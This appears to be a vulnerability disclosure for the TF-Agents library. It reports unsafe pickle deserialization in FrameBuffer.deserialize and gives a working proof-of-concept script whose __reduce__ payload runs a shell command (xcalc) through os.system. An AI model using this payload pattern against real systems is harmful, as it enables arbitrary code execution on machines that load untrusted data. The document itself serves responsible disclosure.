# Description
TF-Agents is a library for Reinforcement Learning in TensorFlow  
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install tf-agents')
from tf_agents.replay_buffers import py_hashed_replay_buffer
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
py_hashed_replay_buffer.FrameBuffer.deserialize(dumps,dumps)
```
* `pip3 install tf-agents`
* `python3 exploit.py`
